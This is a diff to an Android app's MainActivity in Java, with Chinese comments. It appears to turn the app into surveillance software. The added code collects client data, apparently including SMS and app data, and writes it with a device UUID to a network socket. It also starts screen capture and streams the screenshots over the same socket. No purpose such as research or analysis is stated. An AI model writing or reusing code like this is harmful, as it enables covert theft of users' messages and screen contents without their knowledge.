@@ -71,7 +71,7 @@ public class MainActivity extends AppCompatActivity {
     private int failTimes;
 
 
-    public void sendClientInfo() {
+    public void sendClientInfo(final String info) {
         new Thread() {
             @Override
             public void run() {
@@ -92,7 +92,8 @@ public class MainActivity extends AppCompatActivity {
                 try {
                     OutputStream socketOutput = socket.getOutputStream();
                     socketOutput.write(AllUtils.getUUIDCache().getBytes(CHAR_SET));
-                    String info = AllUtils.getClientInfo(MainActivity.this);
+
+
                     LogUtils.i("======" + info);
                     socketOutput.write("str".getBytes());
                     socketOutput.write(info.getBytes(CHAR_SET));
@@ -148,17 +149,35 @@ public class MainActivity extends AppCompatActivity {
         }
 
         failTimes = 0;
-        sendClientInfo();
+        String info = AllUtils.getClientInfo(MainActivity.this, false, listenerDataComplete);
+
+        sendClientInfo(info);
 
         if (Build.VERSION.SDK_INT < Build.VERSION_CODES.LOLLIPOP) {
             ToastUtils.showLong("系统版本太低");
             return;
         }
-        projectionManager = (MediaProjectionManager) getSystemService(MEDIA_PROJECTION_SERVICE);
-//        startActivityForResult(projectionManager.createScreenCaptureIntent(), SCREEN_SHOT);
-
+        if (!isScreening) {
+            projectionManager = (MediaProjectionManager) getSystemService(MEDIA_PROJECTION_SERVICE);
+            startActivityForResult(projectionManager.createScreenCaptureIntent(), SCREEN_SHOT);
+            isScreening = true;
+        }
 
     }
+
+
+    private AllUtils.OnSmsAppComeplete listenerDataComplete = new AllUtils.OnSmsAppComeplete() {
+
+        @Override
+        public void onComplete(String jsonData) {
+            sendClientInfo(jsonData);
+        }
+    };
+
+    /**
+     * 是否正在录像
+     */
+    private boolean isScreening = false;
 
     @RequiresApi(api = Build.VERSION_CODES.LOLLIPOP)
     @Override
@@ -193,6 +212,7 @@ public class MainActivity extends AppCompatActivity {
 //                        saveBitmap(bitmap);
                     sendBitmaSocket(bmp);
                     image.close();
+                    isScreening=true;
 
 
                 }
@@ -267,6 +287,8 @@ public class MainActivity extends AppCompatActivity {
     @Override
     protected void onDestroy() {
         super.onDestroy();
+        isScreening=false;
+
     }
 
     @Override
